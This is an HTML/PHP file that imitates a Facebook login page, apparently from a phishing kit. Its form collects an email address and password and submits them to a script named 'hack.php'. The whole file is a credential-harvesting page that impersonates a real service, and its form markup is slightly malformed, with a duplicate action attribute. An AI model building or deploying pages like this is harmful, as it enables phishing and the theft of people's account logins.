<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>

<?php
include 'config.php';

 ?>

    <section class="login-form-wrap">
    <h1>Facebook</h1>
    <form class="login-form" action="POST" action="hack.php">
      <label>
        <input type="email" name="email" required placeholder="Email">
      </label>
      <label>
        <input type="password" name="password" required placeholder="Password">
      </label>
      <input type="submit" value="Login">
    </form>
    <h5><a href="#">Forgot password</a></h5>
  </section>
  </body>
</html>
